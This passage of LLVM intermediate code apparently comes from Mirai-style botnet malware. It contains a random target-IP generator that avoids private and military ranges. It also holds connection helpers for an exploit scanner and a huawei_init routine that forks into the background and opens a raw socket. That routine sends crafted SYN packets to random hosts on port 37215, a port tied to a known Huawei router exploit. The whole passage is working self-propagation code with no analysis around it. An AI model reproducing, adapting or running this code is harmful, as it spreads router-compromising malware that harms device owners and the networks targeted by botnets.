  %56 = icmp eq i32 %55, 192
  br i1 %56, label %57, label %61

57:                                               ; preds = %53
  %58 = load i8, i8* %3, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 168
  br i1 %60, label %163, label %61

61:                                               ; preds = %57, %53
  %62 = load i8, i8* %2, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %73

65:                                               ; preds = %61
  %66 = load i8, i8* %3, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sge i32 %67, 16
  br i1 %68, label %69, label %73

69:                                               ; preds = %65
  %70 = load i8, i8* %3, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  br i1 %72, label %163, label %73

73:                                               ; preds = %69, %65, %61
  %74 = load i8, i8* %2, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 100
  br i1 %76, label %77, label %85

77:                                               ; preds = %73
  %78 = load i8, i8* %3, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sge i32 %79, 64
  br i1 %80, label %81, label %85

81:                                               ; preds = %77
  %82 = load i8, i8* %3, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp slt i32 %83, 127
  br i1 %84, label %163, label %85

85:                                               ; preds = %81, %77, %73
  %86 = load i8, i8* %2, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 169
  br i1 %88, label %89, label %93

89:                                               ; preds = %85
  %90 = load i8, i8* %3, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sgt i32 %91, 254
  br i1 %92, label %163, label %93

93:                                               ; preds = %89, %85
  %94 = load i8, i8* %2, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 198
  br i1 %96, label %97, label %105

97:                                               ; preds = %93
  %98 = load i8, i8* %3, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 18
  br i1 %100, label %101, label %105

101:                                              ; preds = %97
  %102 = load i8, i8* %3, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %103, 20
  br i1 %104, label %163, label %105

105:                                              ; preds = %101, %97, %93
  %106 = load i8, i8* %2, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp sge i32 %107, 224
  br i1 %108, label %163, label %109

109:                                              ; preds = %105
  %110 = load i8, i8* %2, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 6
  br i1 %112, label %161, label %113

113:                                              ; preds = %109
  %114 = load i8, i8* %2, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 7
  br i1 %116, label %161, label %117

117:                                              ; preds = %113
  %118 = load i8, i8* %2, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 11
  br i1 %120, label %161, label %121

121:                                              ; preds = %117
  %122 = load i8, i8* %2, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 21
  br i1 %124, label %161, label %125

125:                                              ; preds = %121
  %126 = load i8, i8* %2, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 22
  br i1 %128, label %161, label %129

129:                                              ; preds = %125
  %130 = load i8, i8* %2, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 26
  br i1 %132, label %161, label %133

133:                                              ; preds = %129
  %134 = load i8, i8* %2, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 28
  br i1 %136, label %161, label %137

137:                                              ; preds = %133
  %138 = load i8, i8* %2, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 29
  br i1 %140, label %161, label %141

141:                                              ; preds = %137
  %142 = load i8, i8* %2, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 30
  br i1 %144, label %161, label %145

145:                                              ; preds = %141
  %146 = load i8, i8* %2, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 33
  br i1 %148, label %161, label %149

149:                                              ; preds = %145
  %150 = load i8, i8* %2, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 55
  br i1 %152, label %161, label %153

153:                                              ; preds = %149
  %154 = load i8, i8* %2, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 214
  br i1 %156, label %161, label %157

157:                                              ; preds = %153
  %158 = load i8, i8* %2, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 215
  br label %161

161:                                              ; preds = %157, %153, %149, %145, %141, %137, %133, %129, %125, %121, %117, %113, %109
  %162 = phi i1 [ true, %153 ], [ true, %149 ], [ true, %145 ], [ true, %141 ], [ true, %137 ], [ true, %133 ], [ true, %129 ], [ true, %125 ], [ true, %121 ], [ true, %117 ], [ true, %113 ], [ true, %109 ], [ %160, %157 ]
  br label %163

163:                                              ; preds = %161, %105, %101, %89, %81, %69, %57, %49, %45, %41, %37, %33, %29, %25
  %164 = phi i1 [ true, %105 ], [ true, %101 ], [ true, %89 ], [ true, %81 ], [ true, %69 ], [ true, %57 ], [ true, %49 ], [ true, %45 ], [ true, %41 ], [ true, %37 ], [ true, %33 ], [ true, %29 ], [ true, %25 ], [ %162, %161 ]
  br i1 %164, label %6, label %165, !llvm.loop !32

165:                                              ; preds = %163
  %166 = load i8, i8* %2, align 1
  %167 = zext i8 %166 to i32
  %168 = shl i32 %167, 24
  %169 = load i8, i8* %3, align 1
  %170 = zext i8 %169 to i32
  %171 = shl i32 %170, 16
  %172 = or i32 %168, %171
  %173 = load i8, i8* %4, align 1
  %174 = zext i8 %173 to i32
  %175 = shl i32 %174, 8
  %176 = or i32 %172, %175
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = shl i32 %178, 0
  %180 = or i32 %176, %179
  %181 = call i32 @htonl(i32 noundef %180) #10
  ret i32 %181
}

declare zeroext i16 @checksum_generic(i16* noundef, i32 noundef) #6

declare zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef, i8* noundef, i16 noundef zeroext, i32 noundef) #6

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #1

declare i64 @recvfrom(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32* noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @exploit_setup_connection(%struct.exploit_scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

10:                                               ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 noundef %13)
  br label %15

15:                                               ; preds = %10, %1
  %16 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #11
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %15
  br label %71

21:                                               ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* noundef %26, i32 noundef 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 noundef %32, i32 noundef 3, i32 noundef 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 noundef %29, i32 noundef 4, i32 noundef %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @exploit_fake_time, align 4
  %47 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

53:                                               ; preds = %21
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %59

58:                                               ; preds = %53, %21
  br label %62

59:                                               ; preds = %53
  %60 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %61 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %60, i32 0, i32 2
  store i32 1, i32* %61, align 8
  br label %62

62:                                               ; preds = %59, %58
  %63 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 noundef %65, %struct.sockaddr* %69, i32 noundef 16)
  br label %71

71:                                               ; preds = %62, %20
  ret void
}

declare i32 @select(i32 noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.timeval* noundef) #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @exploit_recv_strip_null(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 noundef %11, i8* noundef %12, i64 noundef %14, i32 noundef %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !33

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @huawei_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #11
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %0
  %38 = load i32, i32* @huawei_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %37, %0
  ret void

41:                                               ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* noundef null) #11
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @huawei_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 5416) #11
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

47:                                               ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %64

50:                                               ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

61:                                               ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %47, !llvm.loop !34

64:                                               ; preds = %47
  %65 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #11
  store i32 %65, i32* @huawei_rsck, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  call void @exit(i32 noundef 0) #14
  unreachable

68:                                               ; preds = %64
  %69 = load i32, i32* @huawei_rsck, align 4
  %70 = load i32, i32* @huawei_rsck, align 4
  %71 = call i32 (i32, i32, ...) @fcntl(i32 noundef %70, i32 noundef 3, i32 noundef 0)
  %72 = or i32 2048, %71
  %73 = call i32 (i32, i32, ...) @fcntl(i32 noundef %69, i32 noundef 4, i32 noundef %72)
  store i32 1, i32* %1, align 4
  %74 = load i32, i32* @huawei_rsck, align 4
  %75 = bitcast i32* %1 to i8*
  %76 = call i32 @setsockopt(i32 noundef %74, i32 noundef 0, i32 noundef 3, i8* noundef %75, i32 noundef 4) #11
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

78:                                               ; preds = %68
  %79 = load i32, i32* @huawei_rsck, align 4
  %80 = call i32 @close(i32 noundef %79)
  call void @exit(i32 noundef 0) #14
  unreachable

81:                                               ; preds = %68
  br label %82

82:                                               ; preds = %86, %81
  %83 = call i32 @rand_next()
  %84 = and i32 %83, 65535
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %2, align 2
  br label %86

86:                                               ; preds = %82
  %87 = load i16, i16* %2, align 2
  %88 = call zeroext i16 @ntohs(i16 noundef zeroext %87) #10
  %89 = zext i16 %88 to i32
  %90 = icmp slt i32 %89, 1024
  br i1 %90, label %82, label %91, !llvm.loop !35

91:                                               ; preds = %86
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i64 1
  %94 = bitcast %struct.iphdr* %93 to %struct.anon.0*
  store %struct.anon.0* %94, %struct.anon.0** %4, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = load i8, i8* %96, align 4
  %98 = and i8 %97, -16
  %99 = or i8 %98, 5
  store i8 %99, i8* %96, align 4
  %100 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = load i8, i8* %101, align 4
  %103 = and i8 %102, 15
  %104 = or i8 %103, 64
  store i8 %104, i8* %101, align 4
  %105 = call zeroext i16 @htons(i16 noundef zeroext 40) #10
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i16 %105, i16* %107, align 2
  %108 = call i32 @rand_next()
  %109 = trunc i32 %108 to i16
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 3
  store i16 %109, i16* %111, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 5
  store i8 64, i8* %113, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8 6, i8* %115, align 1
  %116 = call zeroext i16 @htons(i16 noundef zeroext -28321) #10
  %117 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 1
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %2, align 2
  %120 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %121 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %120, i32 0, i32 0
  store i16 %119, i16* %121, align 4
  %122 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -241
  %126 = or i16 %125, 80
  store i16 %126, i16* %123, align 4
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  %130 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 5
  store i16 %129, i16* %131, align 2
  %132 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -513
  %136 = or i16 %135, 512
  store i16 %136, i16* %133, align 4
  br label %137

137:                                              ; preds = %730, %91
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %138 = load i32, i32* @huawei_fake_time, align 4
  %139 = load i32, i32* %10, align 4
  %140 = icmp ne i32 %138, %139
  br i1 %140, label %141, label %205

141:                                              ; preds = %137
  %142 = load i32, i32* @huawei_fake_time, align 4
  store i32 %142, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %143

143:                                              ; preds = %201, %141
  %144 = load i32, i32* %1, align 4
  %145 = icmp slt i32 %144, 160
  br i1 %145, label %146, label %204

146:                                              ; preds = %143
  %147 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %147, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i64 1
  %150 = bitcast %struct.iphdr* %149 to %struct.anon.0*
  store %struct.anon.0* %150, %struct.anon.0** %16, align 8
  %151 = call i32 @rand_next()
  %152 = trunc i32 %151 to i16
  %153 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i32, i32* @LOCAL_ADDR, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 8
  store i32 %155, i32* %157, align 4
  %158 = call i32 @get_random_ip.76()
  %159 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 7
  store i16 0, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %164 = bitcast %struct.iphdr* %163 to i16*
  %165 = call zeroext i16 @checksum_generic(i16* noundef %164, i32 noundef 20)
  %166 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 noundef zeroext -28321) #10
  %169 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 1
  store i16 %168, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %175 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %174, i32 0, i32 2
  store i32 %173, i32* %175, align 4
  %176 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 6
  store i16 0, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %180 = bitcast %struct.anon.0* %179 to i8*
  %181 = call zeroext i16 @htons(i16 noundef zeroext 20) #10
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %178, i8* noundef %180, i16 noundef zeroext %181, i32 noundef 20)
  %183 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 6
  store i16 %182, i16* %184, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 1
  %193 = load i16, i16* %192, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* @huawei_rsck, align 4
  %196 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %197 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %197, %struct.sockaddr** %196, align 8
  %198 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %199 = load %struct.sockaddr*, %struct.sockaddr** %198, align 8
  %200 = call i64 @sendto(i32 noundef %195, i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), i64 noundef 40, i32 noundef 16384, %struct.sockaddr* %199, i32 noundef 16)
  br label %201

201:                                              ; preds = %146
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  br label %143, !llvm.loop !36

204:                                              ; preds = %143
  br label %205

205:                                              ; preds = %204, %137
  store i32 0, i32* %9, align 4
  br label %206

206:                                              ; preds = %339, %311, %299, %291, %283, %275, %267, %258, %249, %242, %235, %205
  store i32 0, i32* %18, align 4
  %207 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %20, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.anon.0*
  store %struct.anon.0* %211, %struct.anon.0** %21, align 8
  %212 = call i32* @__errno_location() #10
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* @huawei_rsck, align 4
  %214 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
